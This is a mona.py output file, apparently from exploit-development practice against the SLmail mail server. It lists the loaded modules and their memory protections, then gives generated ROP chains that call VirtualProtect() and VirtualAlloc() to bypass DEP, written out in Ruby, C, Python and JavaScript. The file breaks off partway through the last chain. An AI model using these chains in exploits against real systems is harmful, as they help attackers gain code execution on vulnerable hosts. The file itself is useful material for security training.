================================================================================
  Output generated by mona.py v2.0, rev 615 - Immunity Debugger
  Corelan Consulting bv - https://www.corelan.be
================================================================================
  OS : 7, release 6.1.7601
  Process being debugged : SLmail (pid 2832)
  Current mona arguments: rop -m *.dll -n -cpb '\x00\x0a\x0d'
================================================================================
  2021-09-19 19:09:36
================================================================================
-----------------------------------------------------------------------------------------------------------------------------------------
 Module info :
-----------------------------------------------------------------------------------------------------------------------------------------
 Base       | Top        | Size       | Rebase | SafeSEH | ASLR  | NXCompat | OS Dll | Version, Modulename & Path
-----------------------------------------------------------------------------------------------------------------------------------------
 0x71750000 | 0x717b6000 | 0x00066000 | True   | True    | True  |  True    | True   | 7.0.7600.16385 [MSVCP60.dll] (C:\Windows\system32\MSVCP60.dll)
 0x001c0000 | 0x001ea000 | 0x0002a000 | True   | False   | False |  False   | False  | 1.0 [ARM.dll] (C:\Program Files\SLmail\ARM.dll)
 0x73b90000 | 0x73ba0000 | 0x00010000 | True   | True    | True  |  True    | True   | 6.1.7601.17514 [NLAapi.dll] (C:\Windows\system32\NLAapi.dll)
 0x74f20000 | 0x74f64000 | 0x00044000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [DNSAPI.dll] (C:\Windows\system32\DNSAPI.dll)
 0x75e90000 | 0x75f64000 | 0x000d4000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [kernel32.dll] (C:\Windows\system32\kernel32.dll)
 0x770c0000 | 0x7716c000 | 0x000ac000 | True   | True    | True  |  True    | True   | 7.0.7600.16385 [msvcrt.dll] (C:\Windows\system32\msvcrt.dll)
 0x75570000 | 0x7557c000 | 0x0000c000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [CRYPTBASE.dll] (C:\Windows\system32\CRYPTBASE.dll)
 0x774d0000 | 0x7760c000 | 0x0013c000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [ntdll.dll] (C:\Windows\SYSTEM32\ntdll.dll)
 0x10000000 | 0x10007000 | 0x00007000 | False  | False   | False |  False   | True   | 4.3.0.2 [Openc32.dll] (C:\Windows\system32\Openc32.dll)
 0x716c0000 | 0x716d2000 | 0x00012000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [pnrpnsp.dll] (C:\Windows\system32\pnrpnsp.dll)
 0x77610000 | 0x77629000 | 0x00019000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [sechost.dll] (C:\Windows\SYSTEM32\sechost.dll)
 0x74bb0000 | 0x74bb5000 | 0x00005000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [wshtcpip.dll] (C:\Windows\System32\wshtcpip.dll)
 0x75cc0000 | 0x75cca000 | 0x0000a000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [LPK.dll] (C:\Windows\system32\LPK.dll)
 0x00400000 | 0x0045c000 | 0x0005c000 | False  | False   | False |  False   | False  | 5.1 [SLmail.exe] (C:\Program Files\SLmail\SLmail.exe)
 0x75920000 | 0x759bd000 | 0x0009d000 | True   | True    | True  |  True    | True   | 1.0626.7601.17514 [USP10.dll] (C:\Windows\system32\USP10.dll)
 0x71650000 | 0x71656000 | 0x00006000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [rasadhlp.dll] (C:\Windows\system32\rasadhlp.dll)
 0x73990000 | 0x739c8000 | 0x00038000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [fwpuclnt.dll] (C:\Windows\System32\fwpuclnt.dll)
 0x73a10000 | 0x73a17000 | 0x00007000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [WINNSI.DLL] (C:\Windows\system32\WINNSI.DLL)
 0x73a20000 | 0x73a3c000 | 0x0001c000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [IPHLPAPI.DLL] (C:\Windows\system32\IPHLPAPI.DLL)
 0x77170000 | 0x772cc000 | 0x0015c000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [ole32.dll] (C:\Windows\system32\ole32.dll)
 0x76de0000 | 0x76e37000 | 0x00057000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [SHLWAPI.dll] (C:\Windows\system32\SHLWAPI.dll)
 0x750a0000 | 0x750b6000 | 0x00016000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [CRYPTSP.dll] (C:\Windows\system32\CRYPTSP.dll)
 0x759c0000 | 0x75a89000 | 0x000c9000 | True   | True    | True  |  True    | True   | 6.1.7601.17514 [USER32.dll] (C:\Windows\system32\USER32.dll)
 0x75fd0000 | 0x7604b000 | 0x0007b000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [comdlg32.dll] (C:\Windows\system32\comdlg32.dll)
 0x75bf0000 | 0x75c1a000 | 0x0002a000 | True   | True    | True  |  True    | True   | 6.1.7601.17514 [IMAGEHLP.dll] (C:\Windows\system32\IMAGEHLP.dll)
 0x74e40000 | 0x74e7b000 | 0x0003b000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [rsaenh.dll] (C:\Windows\system32\rsaenh.dll)
 0x716e0000 | 0x716f0000 | 0x00010000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [napinsp.dll] (C:\Windows\system32\napinsp.dll)
 0x75c30000 | 0x75cbf000 | 0x0008f000 | True   | True    | True  |  True    | True   | 6.1.7601.17514 [OLEAUT32.dll] (C:\Windows\system32\OLEAUT32.dll)
 0x75620000 | 0x7562b000 | 0x0000b000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [profapi.dll] (C:\Windows\system32\profapi.dll)
 0x76050000 | 0x76c9a000 | 0x00c4a000 | True   | True    | True  |  True    | True   | 6.1.7601.17514 [SHELL32.dll] (C:\Windows\system32\SHELL32.dll)
 0x75de0000 | 0x75e81000 | 0x000a1000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [RPCRT4.dll] (C:\Windows\system32\RPCRT4.dll)
 0x77030000 | 0x770b3000 | 0x00083000 | True   | True    | True  |  True    | True   | 2001.12.8530.16385 [CLBCatQ.DLL] (C:\Windows\system32\CLBCatQ.DLL)
 0x77640000 | 0x7765f000 | 0x0001f000 | True   | True    | True  |  True    | True   | 6.1.7601.17514 [IMM32.DLL] (C:\Windows\system32\IMM32.DLL)
 0x716b0000 | 0x716b8000 | 0x00008000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [winrnr.dll] (C:\Windows\System32\winrnr.dll)
 0x75c20000 | 0x75c26000 | 0x00006000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [NSI.dll] (C:\Windows\system32\NSI.dll)
 0x75cd0000 | 0x75d9c000 | 0x000cc000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [MSCTF.dll] (C:\Windows\system32\MSCTF.dll)
 0x5f400000 | 0x5f4f4000 | 0x000f4000 | False  | False   | False |  False   | True   | 6.00.8063.0 [SLMFC.DLL] (C:\Windows\system32\SLMFC.DLL)
 0x72310000 | 0x72394000 | 0x00084000 | True   | True    | True  |  True    | True   | 5.82 [COMCTL32.dll] (C:\Windows\WinSxS\x86_microsoft.windows.common-controls_6595b64144ccf1df_5.82.7601.17514_none_ec83dffa859149af\COMCTL32.dll)
 0x00020000 | 0x00029000 | 0x00009000 | True   | False   | False |  False   | True   | 1.1 [ExcptHnd.dll] (C:\Windows\system32\ExcptHnd.dll)
 0x75610000 | 0x7561e000 | 0x0000e000 | True   | True    | True  |  True    | True   | 6.1.7601.17514 [RpcRtRemote.dll] (C:\Windows\system32\RpcRtRemote.dll)
 0x75ba0000 | 0x75bee000 | 0x0004e000 | True   | True    | True  |  True    | True   | 6.1.7601.17514 [GDI32.dll] (C:\Windows\system32\GDI32.dll)
 0x75700000 | 0x7574a000 | 0x0004a000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [KERNELBASE.dll] (C:\Windows\system32\KERNELBASE.dll)
 0x74b20000 | 0x74b29000 | 0x00009000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [VERSION.dll] (C:\Windows\system32\VERSION.dll)
 0x77660000 | 0x77700000 | 0x000a0000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [ADVAPI32.dll] (C:\Windows\system32\ADVAPI32.dll)
 0x001f0000 | 0x0020f000 | 0x0001f000 | True   | False   | False |  False   | True   | 1.1 [Antares.dll] (C:\Windows\system32\Antares.dll)
 0x75da0000 | 0x75dd5000 | 0x00035000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [WS2_32.dll] (C:\Windows\system32\WS2_32.dll)
 0x75060000 | 0x7509c000 | 0x0003c000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [mswsock.dll] (C:\Windows\system32\mswsock.dll)
 0x74c80000 | 0x74c97000 | 0x00017000 | True   | True    | True  |  True    | True   | 6.1.7600.16385 [userenv.dll] (C:\Windows\system32\userenv.dll)
-----------------------------------------------------------------------------------------------------------------------------------------

################################################################################

Register setup for VirtualProtect() :
--------------------------------------------
 EAX = NOP (0x90909090)
 ECX = lpOldProtect (ptr to W address)
 EDX = NewProtect (0x40)
 EBX = dwSize
 ESP = lPAddress (automatic)
 EBP = ReturnTo (ptr to jmp esp)
 ESI = ptr to VirtualProtect()
 EDI = ROP NOP (RETN)
 --- alternative chain ---
 EAX = ptr to &VirtualProtect()
 ECX = lpOldProtect (ptr to W address)
 EDX = NewProtect (0x40)
 EBX = dwSize
 ESP = lPAddress (automatic)
 EBP = POP (skip 4 bytes)
 ESI = ptr to JMP [EAX]
 EDI = ROP NOP (RETN)
 + place ptr to "jmp esp" on stack, below PUSHAD
--------------------------------------------


ROP Chain for VirtualProtect() [(XP/2003 Server and up)] :
----------------------------------------------------------

*** [ Ruby ] ***

  def create_rop_chain()

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = 
    [
      #[---INFO:gadgets_to_set_esi:---]
      0x717ab4d5,  # POP ECX # RETN [MSVCP60.dll] ** REBASED ** ASLR 
      0x5f49a2c0,  # ptr to &VirtualProtect() [IAT SLMFC.DLL]
      0x75cefd52,  # MOV ESI,DWORD PTR DS:[ECX] # ADD DH,DH # RETN [MSCTF.dll] ** REBASED ** ASLR 
      #[---INFO:gadgets_to_set_ebp:---]
      0x770cde48,  # POP EBP # RETN [msvcrt.dll] ** REBASED ** ASLR 
      0x7179fb51,  # & call esp [MSVCP60.dll] ** REBASED ** ASLR
      #[---INFO:gadgets_to_set_ebx:---]
      0x7709b7d2,  # POP EAX # RETN [CLBCatQ.DLL] ** REBASED ** ASLR 
      0xfffffdff,  # Value to negate, will become 0x00000201
      0x7628ab1d,  # NEG EAX # RETN [SHELL32.dll] ** REBASED ** ASLR 
      0x760ebbc8,  # XCHG EAX,EBX # RETN [SHELL32.dll] ** REBASED ** ASLR 
      #[---INFO:gadgets_to_set_edx:---]
      0x76317a7d,  # POP EAX # RETN [SHELL32.dll] ** REBASED ** ASLR 
      0xffffffc0,  # Value to negate, will become 0x00000040
      0x75c016a5,  # NEG EAX # RETN [IMAGEHLP.dll] ** REBASED ** ASLR 
      0x75fed586,  # XCHG EAX,EDX # RETN [comdlg32.dll] ** REBASED ** ASLR 
      #[---INFO:gadgets_to_set_ecx:---]
      0x5f499e66,  # POP ECX # RETN [SLMFC.DLL] 
      0x7561b045,  # &Writable location [RpcRtRemote.dll] ** REBASED ** ASLR
      #[---INFO:gadgets_to_set_edi:---]
      0x5f42f9d8,  # POP EDI # RETN [SLMFC.DLL] 
      0x76e26a92,  # RETN (ROP NOP) [SHLWAPI.dll] ** REBASED ** ASLR
      #[---INFO:gadgets_to_set_eax:---]
      0x5f45dfd5,  # POP EAX # RETN [SLMFC.DLL] 
      0x90909090,  # nop
      #[---INFO:pushad:---]
      0x5f495b3d,  # PUSHAD # RETN [SLMFC.DLL] 
    ].flatten.pack("V*")

    return rop_gadgets

  end


  # Call the ROP chain generator inside the 'exploit' function :


  rop_chain = create_rop_chain()



*** [ C ] ***

  #define CREATE_ROP_CHAIN(name, ...) \
    int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \
    unsigned int name[name##_length / sizeof(unsigned int)]; \
    create_rop_chain(name, ##__VA_ARGS__);

  int create_rop_chain(unsigned int *buf, unsigned int )
  {
    // rop chain generated with mona.py - www.corelan.be
    unsigned int rop_gadgets[] = {
      //[---INFO:gadgets_to_set_esi:---]
      0x717ab4d5,  // POP ECX // RETN [MSVCP60.dll] ** REBASED ** ASLR 
      0x5f49a2c0,  // ptr to &VirtualProtect() [IAT SLMFC.DLL]
      0x75cefd52,  // MOV ESI,DWORD PTR DS:[ECX] // ADD DH,DH // RETN [MSCTF.dll] ** REBASED ** ASLR 
      //[---INFO:gadgets_to_set_ebp:---]
      0x770cde48,  // POP EBP // RETN [msvcrt.dll] ** REBASED ** ASLR 
      0x7179fb51,  // & call esp [MSVCP60.dll] ** REBASED ** ASLR
      //[---INFO:gadgets_to_set_ebx:---]
      0x7709b7d2,  // POP EAX // RETN [CLBCatQ.DLL] ** REBASED ** ASLR 
      0xfffffdff,  // Value to negate, will become 0x00000201
      0x7628ab1d,  // NEG EAX // RETN [SHELL32.dll] ** REBASED ** ASLR 
      0x760ebbc8,  // XCHG EAX,EBX // RETN [SHELL32.dll] ** REBASED ** ASLR 
      //[---INFO:gadgets_to_set_edx:---]
      0x76317a7d,  // POP EAX // RETN [SHELL32.dll] ** REBASED ** ASLR 
      0xffffffc0,  // Value to negate, will become 0x00000040
      0x75c016a5,  // NEG EAX // RETN [IMAGEHLP.dll] ** REBASED ** ASLR 
      0x75fed586,  // XCHG EAX,EDX // RETN [comdlg32.dll] ** REBASED ** ASLR 
      //[---INFO:gadgets_to_set_ecx:---]
      0x5f499e66,  // POP ECX // RETN [SLMFC.DLL] 
      0x7561b045,  // &Writable location [RpcRtRemote.dll] ** REBASED ** ASLR
      //[---INFO:gadgets_to_set_edi:---]
      0x5f42f9d8,  // POP EDI // RETN [SLMFC.DLL] 
      0x76e26a92,  // RETN (ROP NOP) [SHLWAPI.dll] ** REBASED ** ASLR
      //[---INFO:gadgets_to_set_eax:---]
      0x5f45dfd5,  // POP EAX // RETN [SLMFC.DLL] 
      0x90909090,  // nop
      //[---INFO:pushad:---]
      0x5f495b3d,  // PUSHAD // RETN [SLMFC.DLL] 
    };
    if(buf != NULL) {
      memcpy(buf, rop_gadgets, sizeof(rop_gadgets));
    };
    return sizeof(rop_gadgets);
  }

  // use the 'rop_chain' variable after this call, it's just an unsigned int[]
  CREATE_ROP_CHAIN(rop_chain, );
  // alternatively just allocate a large enough buffer and get the rop chain, i.e.:
  // unsigned int rop_chain[256];
  // int rop_chain_length = create_rop_chain(rop_chain, );

*** [ Python ] ***

  def create_rop_chain():

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
      #[---INFO:gadgets_to_set_esi:---]
      0x717ab4d5,  # POP ECX # RETN [MSVCP60.dll] ** REBASED ** ASLR 
      0x5f49a2c0,  # ptr to &VirtualProtect() [IAT SLMFC.DLL]
      0x75cefd52,  # MOV ESI,DWORD PTR DS:[ECX] # ADD DH,DH # RETN [MSCTF.dll] ** REBASED ** ASLR 
      #[---INFO:gadgets_to_set_ebp:---]
      0x770cde48,  # POP EBP # RETN [msvcrt.dll] ** REBASED ** ASLR 
      0x7179fb51,  # & call esp [MSVCP60.dll] ** REBASED ** ASLR
      #[---INFO:gadgets_to_set_ebx:---]
      0x7709b7d2,  # POP EAX # RETN [CLBCatQ.DLL] ** REBASED ** ASLR 
      0xfffffdff,  # Value to negate, will become 0x00000201
      0x7628ab1d,  # NEG EAX # RETN [SHELL32.dll] ** REBASED ** ASLR 
      0x760ebbc8,  # XCHG EAX,EBX # RETN [SHELL32.dll] ** REBASED ** ASLR 
      #[---INFO:gadgets_to_set_edx:---]
      0x76317a7d,  # POP EAX # RETN [SHELL32.dll] ** REBASED ** ASLR 
      0xffffffc0,  # Value to negate, will become 0x00000040
      0x75c016a5,  # NEG EAX # RETN [IMAGEHLP.dll] ** REBASED ** ASLR 
      0x75fed586,  # XCHG EAX,EDX # RETN [comdlg32.dll] ** REBASED ** ASLR 
      #[---INFO:gadgets_to_set_ecx:---]
      0x5f499e66,  # POP ECX # RETN [SLMFC.DLL] 
      0x7561b045,  # &Writable location [RpcRtRemote.dll] ** REBASED ** ASLR
      #[---INFO:gadgets_to_set_edi:---]
      0x5f42f9d8,  # POP EDI # RETN [SLMFC.DLL] 
      0x76e26a92,  # RETN (ROP NOP) [SHLWAPI.dll] ** REBASED ** ASLR
      #[---INFO:gadgets_to_set_eax:---]
      0x5f45dfd5,  # POP EAX # RETN [SLMFC.DLL] 
      0x90909090,  # nop
      #[---INFO:pushad:---]
      0x5f495b3d,  # PUSHAD # RETN [SLMFC.DLL] 
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

  rop_chain = create_rop_chain()



*** [ JavaScript ] ***

  //rop chain generated with mona.py - www.corelan.be
  rop_gadgets = unescape(
    "" + // #[---INFO:gadgets_to_set_esi:---] : 
    "%ub4d5%u717a" + // 0x717ab4d5 : ,# POP ECX # RETN [MSVCP60.dll] ** REBASED ** ASLR 
    "%ua2c0%u5f49" + // 0x5f49a2c0 : ,# ptr to &VirtualProtect() [IAT SLMFC.DLL]
    "%ufd52%u75ce" + // 0x75cefd52 : ,# MOV ESI,DWORD PTR DS:[ECX] # ADD DH,DH # RETN [MSCTF.dll] ** REBASED ** ASLR 
    "" + // #[---INFO:gadgets_to_set_ebp:---] : 
    "%ude48%u770c" + // 0x770cde48 : ,# POP EBP # RETN [msvcrt.dll] ** REBASED ** ASLR 
    "%ufb51%u7179" + // 0x7179fb51 : ,# & call esp [MSVCP60.dll] ** REBASED ** ASLR
    "" + // #[---INFO:gadgets_to_set_ebx:---] : 
    "%ub7d2%u7709" + // 0x7709b7d2 : ,# POP EAX # RETN [CLBCatQ.DLL] ** REBASED ** ASLR 
    "%ufdff%uffff" + // 0xfffffdff : ,# Value to negate, will become 0x00000201
    "%uab1d%u7628" + // 0x7628ab1d : ,# NEG EAX # RETN [SHELL32.dll] ** REBASED ** ASLR 
    "%ubbc8%u760e" + // 0x760ebbc8 : ,# XCHG EAX,EBX # RETN [SHELL32.dll] ** REBASED ** ASLR 
    "" + // #[---INFO:gadgets_to_set_edx:---] : 
    "%u7a7d%u7631" + // 0x76317a7d : ,# POP EAX # RETN [SHELL32.dll] ** REBASED ** ASLR 
    "%uffc0%uffff" + // 0xffffffc0 : ,# Value to negate, will become 0x00000040
    "%u16a5%u75c0" + // 0x75c016a5 : ,# NEG EAX # RETN [IMAGEHLP.dll] ** REBASED ** ASLR 
    "%ud586%u75fe" + // 0x75fed586 : ,# XCHG EAX,EDX # RETN [comdlg32.dll] ** REBASED ** ASLR 
    "" + // #[---INFO:gadgets_to_set_ecx:---] : 
    "%u9e66%u5f49" + // 0x5f499e66 : ,# POP ECX # RETN [SLMFC.DLL] 
    "%ub045%u7561" + // 0x7561b045 : ,# &Writable location [RpcRtRemote.dll] ** REBASED ** ASLR
    "" + // #[---INFO:gadgets_to_set_edi:---] : 
    "%uf9d8%u5f42" + // 0x5f42f9d8 : ,# POP EDI # RETN [SLMFC.DLL] 
    "%u6a92%u76e2" + // 0x76e26a92 : ,# RETN (ROP NOP) [SHLWAPI.dll] ** REBASED ** ASLR
    "" + // #[---INFO:gadgets_to_set_eax:---] : 
    "%udfd5%u5f45" + // 0x5f45dfd5 : ,# POP EAX # RETN [SLMFC.DLL] 
    "%u9090%u9090" + // 0x90909090 : ,# nop
    "" + // #[---INFO:pushad:---] : 
    "%u5b3d%u5f49" + // 0x5f495b3d : ,# PUSHAD # RETN [SLMFC.DLL] 
    ""); //  : 


--------------------------------------------------------------------------------------------------


################################################################################

Register setup for VirtualAlloc() :
--------------------------------------------
 EAX = NOP (0x90909090)
 ECX = flProtect (0x40)
 EDX = flAllocationType (0x1000)
 EBX = dwSize
 ESP = lpAddress (automatic)
 EBP = ReturnTo (ptr to jmp esp)
 ESI = ptr to VirtualAlloc()
 EDI = ROP NOP (RETN)
 --- alternative chain ---
 EAX = ptr to &VirtualAlloc()
 ECX = flProtect (0x40)
 EDX = flAllocationType (0x1000)
 EBX = dwSize
 ESP = lpAddress (automatic)
 EBP = POP (skip 4 bytes)
 ESI = ptr to JMP [EAX]
 EDI = ROP NOP (RETN)
 + place ptr to "jmp esp" on stack, below PUSHAD
--------------------------------------------


ROP Chain for VirtualAlloc() [(XP/2003 Server and up)] :
--------------------------------------------------------

*** [ Ruby ] ***

  def create_rop_chain()

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = 
    [
      #[---INFO:gadgets_to_set_esi:---]
      0x717ab52d,  # POP ECX # RETN [MSVCP60.dll] ** REBASED ** ASLR 
      0x75e91914,  # ptr to &VirtualAlloc() [IAT kernel32.dll] ** REBASED ** ASLR
      0x75cefd52,  # MOV ESI,DWORD PTR DS:[ECX] # ADD DH,DH # RETN [MSCTF.dll] ** REBASED ** ASLR 
      #[---INFO:gadgets_to_set_ebp:---]
      0x770ca767,  # POP EBP # RETN [msvcrt.dll] ** REBASED ** ASLR 
      0x7179fb51,  # & call esp [MSVCP60.dll] ** REBASED ** ASLR
      #[---INFO:gadgets_to_set_ebx:---]
      0x5f471dc7,  # POP EAX # RETN [SLMFC.DLL] 
      0xffffffff,  # Value to negate, will become 0x00000001
      0x76400cb6,  # NEG EAX # RETN [SHELL32.dll] ** REBASED ** ASLR 
      0x772527c9,  # XCHG EAX,EBX # RETN [ole32.dll] ** REBASED ** ASLR 
      #[---INFO:gadgets_to_set_edx:---]
      0x7178648b,  # POP EAX # RETN [MSVCP60.dll] ** REBASED ** ASLR 
      0xa03fdc8a,  # put delta into eax (-> put 0x00001000 into edx)
      0x762e400c,  # ADD EAX,5FC03376 # INC EAX # POP ESI # POP EBP # RETN 0x08 [SHELL32.dll] ** REBASED ** ASLR 
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x74f35b2e,  # XCHG EAX,EDX # RETN [DNSAPI.dll] ** REBASED ** ASLR 
      0x41414141,  # Filler (RETN offset compensation)
      0x41414141,  # Filler (RETN offset compensation)
      #[---INFO:gadgets_to_set_ecx:---]
      0x7178603c,  # POP EAX # RETN [MSVCP60.dll] ** REBASED ** ASLR 
      0xffffffc0,  # Value to negate, will become 0x00000040
      0x75e01643,  # NEG EAX # RETN [RPCRT4.dll] ** REBASED ** ASLR 
      0x771736b6,  # XCHG EAX,ECX # RETN [ole32.dll] ** REBASED ** ASLR 
      #[---INFO:gadgets_to_set_edi:---]
      0x5f464445,  # POP EDI # RETN [SLMFC.DLL] 
      0x76e26a92,  # RETN (ROP NOP) [SHLWAPI.dll] ** REBASED ** ASLR
      #[---INFO:gadgets_to_set_eax:---]
      0x77227301,  # POP EAX # RETN [ole32.dll] ** REBASED ** ASLR 
      0x90909090,  # nop
      #[---INFO:pushad:---]
      0x75c58638,  # PUSHAD # RETN [OLEAUT32.dll] ** REBASED ** ASLR 
    ].flatten.pack("V*")

    return rop_gadgets

  end


  # Call the ROP chain generator inside the 'exploit' function :


  rop_chain = create_rop_chain()



*** [ C ] ***

  #define CREATE_ROP_CHAIN(name, ...) \
    int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \
    unsigned int name[name##_length / sizeof(unsigned int)]; \
    create_rop_chain(name, ##__VA_ARGS__);

  int create_rop_chain(unsigned int *buf, unsigned int )
  {
    // rop chain generated with mona.py - www.corelan.be
    unsigned int rop_gadgets[] = {
      //[---INFO:gadgets_to_set_esi:---]
      0x717ab52d,  // POP ECX // RETN [MSVCP60.dll] ** REBASED ** ASLR 
      0x75e91914,  // ptr to &VirtualAlloc() [IAT kernel32.dll] ** REBASED ** ASLR
      0x75cefd52,  // MOV ESI,DWORD PTR DS:[ECX] // ADD DH,DH // RETN [MSCTF.dll] ** REBASED ** ASLR 
      //[---INFO:gadgets_to_set_ebp:---]
      0x770ca767,  // POP EBP // RETN [msvcrt.dll] ** REBASED ** ASLR 
      0x7179fb51,  // & call esp [MSVCP60.dll] ** REBASED ** ASLR
      //[---INFO:gadgets_to_set_ebx:---]
      0x5f471dc7,  // POP EAX // RETN [SLMFC.DLL] 
      0xffffffff,  // Value to negate, will become 0x00000001
      0x76400cb6,  // NEG EAX // RETN [SHELL32.dll] ** REBASED ** ASLR 
      0x772527c9,  // XCHG EAX,EBX // RETN [ole32.dll] ** REBASED ** ASLR 
      //[---INFO:gadgets_to_set_edx:---]
      0x7178648b,  // POP EAX // RETN [MSVCP60.dll] ** REBASED ** ASLR 
      0xa03fdc8a,  // put delta into eax (-> put 0x00001000 into edx)
      0x762e400c,  // ADD EAX,5FC03376 // INC EAX // POP ESI // POP EBP // RETN 0x08 [SHELL32.dll] ** REBASED ** ASLR 
      0x41414141,  // Filler (compensate)
      0x41414141,  // Filler (compensate)
      0x74f35b2e,  // XCHG EAX,EDX // RETN [DNSAPI.dll] ** REBASED ** ASLR 
      0x41414141,  // Filler (RETN offset compensation)
      0x41414141,  // Filler (RETN offset compensation)
      //[---INFO:gadgets_to_set_ecx:---]
      0x7178603c,  // POP EAX // RETN [MSVCP60.dll] ** REBASED ** ASLR 
      0xffffffc0,  // Value to negate, will become 0x00000040
      0x75e01643,  // NEG EAX // RETN [RPCRT4.dll] ** REBASED ** ASLR 
      0x771736b6,  // XCHG EAX,ECX // RETN [ole32.dll] ** REBASED ** ASLR 
      //[---INFO:gadgets_to_set_edi:---]
      0x5f464445,  // POP EDI // RETN [SLMFC.DLL] 
      0x76e26a92,  // RETN (ROP NOP) [SHLWAPI.dll] ** REBASED ** ASLR
      //[---INFO:gadgets_to_set_eax:---]
      0x77227301,  // POP EAX // RETN [ole32.dll] ** REBASED ** ASLR 
      0x90909090,  // nop
      //[---INFO:pushad:---]
      0x75c58638,  // PUSHAD // RETN [OLEAUT32.dll] ** REBASED ** ASLR 
    };
    if(buf != NULL) {
      memcpy(buf, rop_gadgets, sizeof(rop_gadgets));
    };
    return sizeof(rop_gadgets);
  }

  // use the 'rop_chain' variable after this call, it's just an unsigned int[]
  CREATE_ROP_CHAIN(rop_chain, );
  // alternatively just allocate a large enough buffer and get the rop chain, i.e.:
  // unsigned int rop_chain[256];
  // int rop_chain_length = create_rop_chain(rop_chain, );

*** [ Python ] ***

  def create_rop_chain():

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
      #[---INFO:gadgets_to_set_esi:---]
      0x717ab52d,  # POP ECX # RETN [MSVCP60.dll] ** REBASED ** ASLR 
      0x75e91914,  # ptr to &VirtualAlloc() [IAT kernel32.dll] ** REBASED ** ASLR
      0x75cefd52,  # MOV ESI,DWORD PTR DS:[ECX] # ADD DH,DH # RETN [MSCTF.dll] ** REBASED ** ASLR 
      #[---INFO:gadgets_to_set_ebp:---]
      0x770ca767,  # POP EBP # RETN [msvcrt.dll] ** REBASED ** ASLR 
      0x7179fb51,  # & call esp [MSVCP60.dll] ** REBASED ** ASLR
      #[---INFO:gadgets_to_set_ebx:---]
      0x5f471dc7,  # POP EAX # RETN [SLMFC.DLL] 
      0xffffffff,  # Value to negate, will become 0x00000001
      0x76400cb6,  # NEG EAX # RETN [SHELL32.dll] ** REBASED ** ASLR 
      0x772527c9,  # XCHG EAX,EBX # RETN [ole32.dll] ** REBASED ** ASLR 
      #[---INFO:gadgets_to_set_edx:---]
      0x7178648b,  # POP EAX # RETN [MSVCP60.dll] ** REBASED ** ASLR 
      0xa03fdc8a,  # put delta into eax (-> put 0x00001000 into edx)
      0x762e400c,  # ADD EAX,5FC03376 # INC EAX # POP ESI # POP EBP # RETN 0x08 [SHELL32.dll] ** REBASED ** ASLR 
      0x41414141,  # Filler (compensate)
      0x41414141,  # Filler (compensate)
      0x74f35b2e,  # XCHG EAX,EDX # RETN [DNSAPI.dll] ** REBASED ** ASLR 
      0x41414141,  # Filler (RETN offset compensation)
      0x41414141,  # Filler (RETN offset compensation)
      #[---INFO:gadgets_to_set_ecx:---]
      0x7178603c,  # POP EAX # RETN [MSVCP60.dll] ** REBASED ** ASLR 
      0xffffffc0,  # Value to negate, will become 0x00000040
      0x75e01643,  # NEG EAX # RETN [RPCRT4.dll] ** REBASED ** ASLR 
      0x771736b6,  # XCHG EAX,ECX # RETN [ole32.dll] ** REBASED ** ASLR 
      #[---INFO:gadgets_to_set_edi:---]
      0x5f464445,  # POP EDI # RETN [SLMFC.DLL] 
      0x76e26a92,  # RETN (ROP NOP) [SHLWAPI.dll] ** REBASED ** ASLR
      #[---INFO:gadgets_to_set_eax:---]
      0x77227301,  # POP EAX # RETN [ole32.dll] ** REBASED ** ASLR 
      0x90909090,  # nop
      #[---INFO:pushad:---]
      0x75c58638,  # PUSHAD # RETN [OLEAUT32.dll] ** REBASED ** ASLR 
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

  rop_chain = create_rop_chain()



*** [ JavaScript ] ***

  //rop chain generated with mona.py - www.corelan.be
  rop_gadgets = unescape(
    "" + // #[---INFO:gadgets_to_set_esi:---] : 
    "%ub52d%u717a" + // 0x717ab52d : ,# POP ECX # RETN [MSVCP60.dll] ** REBASED ** ASLR 
    "%u1914%u75e9" + // 0x75e91914 : ,# ptr to &VirtualAlloc() [IAT kernel32.dll] ** REBASED ** ASLR
    "%ufd52%u75ce" + // 0x75cefd52 : ,# MOV ESI,DWORD PTR DS:[ECX] # ADD DH,DH # RETN [MSCTF.dll] ** REBASED ** ASLR 
    "" + // #[---INFO:gadgets_to_set_ebp:---] : 
    "%ua767%u770c" + // 0x770ca767 : ,# POP EBP # RETN [msvcrt.dll] ** REBASED ** ASLR 
    "%ufb51%u7179" + // 0x7179fb51 : ,# & call esp [MSVCP60.dll] ** REBASED ** ASLR
    "" + // #[---INFO:gadgets_to_set_ebx:---] : 
    "%u1dc7%u5f47" + // 0x5f471dc7 : ,# POP EAX # RETN [SLMFC.DLL] 
